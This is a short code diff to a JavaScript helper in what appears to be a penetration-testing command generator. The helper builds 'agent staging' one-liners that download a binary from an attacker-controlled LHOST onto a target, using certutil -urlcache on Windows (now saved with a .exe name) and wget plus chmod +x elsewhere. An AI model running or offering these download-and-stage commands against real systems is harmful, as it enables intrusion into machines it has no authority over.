@@ -68,8 +68,14 @@
   // The "get the agent onto the target" line (serve it from your box, pull it on the target).
   function agentStage(c, osName, bin) {
     bin = bin || 'agent';
+    if (osName === 'windows') {
+      // Must save WITH the .exe extension, or the `.\agent.exe -connect` line below fails with
+      // "not recognized as an internal or external command" (certutil keeps whatever name you give it).
+      var winBin = bin + '.exe';
+      var wurl = 'http://' + (c.lhost || 'LHOST') + ':8000/' + winBin;
+      return 'certutil -urlcache -f ' + wurl + ' ' + winBin + '   # serve it: python3 -m http.server 8000';
+    }
     var url = 'http://' + (c.lhost || 'LHOST') + ':8000/' + bin;
-    if (osName === 'windows') return 'certutil -urlcache -f ' + url + ' ' + bin + '   # serve it: python3 -m http.server 8000';
     return 'wget ' + url + ' -O ' + bin + ' && chmod +x ' + bin + '   # serve it: python3 -m http.server 8000';
   }
 
